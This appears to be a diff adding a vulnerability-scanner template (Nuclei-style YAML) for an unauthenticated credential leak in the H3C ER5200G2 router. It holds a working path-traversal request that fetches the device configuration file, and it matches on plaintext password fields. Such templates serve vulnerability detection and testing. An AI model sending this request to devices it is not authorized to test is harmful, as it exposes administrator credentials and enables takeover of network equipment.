@@ -1,0 +1,33 @@
+id: H3C-ER5200G2-Information-disclosure
+
+info:
+  name: "H3C ER5200G2路由器未认证敏感信息泄露漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    Hunter: app.name="H3C Router Management"
+      H3C ER5200G2路由器因身份验证机制缺失，导致攻击者可通过非授权访问获取系统管理凭据等敏感数据。该漏洞允许远程攻击者绕过认证流程，直接读取存储在配置接口中的明文账号密码信息，进而实现对设备管理界面的未授权控制。系统缺乏基础访问控制策略，可能造成设备配置被篡改、网络服务被劫持等严重安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/h5ihiD-Ewa8hfJG6ve8QOg
+  tags: H3C
+
+http:
+- raw:
+  - |
+    GET /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "vtypasswd="
+    - "vtypasswdtype="
+    - "vtyname="
+    - "H3C"
+    condition: and
+  - type: status
+    status:
+    - 200
